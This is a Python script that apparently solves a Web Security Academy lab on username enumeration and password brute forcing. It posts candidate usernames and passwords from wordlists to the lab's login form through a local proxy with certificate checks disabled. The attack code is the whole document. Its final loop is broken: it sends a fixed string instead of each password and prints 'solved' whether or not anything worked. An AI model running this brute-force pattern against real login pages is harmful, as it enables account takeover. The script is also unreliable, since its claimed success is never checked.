# Login in application use the same session to send next request

import requests
import urllib3


# Suppress only the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a0800f403420a518199073d00b3000d.web-security-academy.net/login"


proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

with open ('username.txt','r') as file:
    for i  in file:
        username_payload=i.strip()
      #  print(username_payload)
        data = {"username":username_payload,"password":"password_payload"}
        response= requests.post(url,verify=False,proxies=proxies,data=data)
        # print(response)
        if 'Incorrect password' in response.text:
           print("username found",username_payload)
           a =  username_payload
 
"""           

with open('password.txt','r') as file:
   for p in file:
      password_payload=p.strip()
      # print(password_payload)
      data = {"username":"academico","password":password_payload}
      r = requests.post(url,verify=False,proxies=proxies,data=data)
      if "Incorrect password" not in r.text:
         print('password is ',password_payload)
"""
with open("password.txt","r") as file:
 for j in file:
    password_payload=j.strip()
    data = {"username":a,"password":"password_payload"}
    r = requests.post(url,verify=False,data=data)
    print("solved")


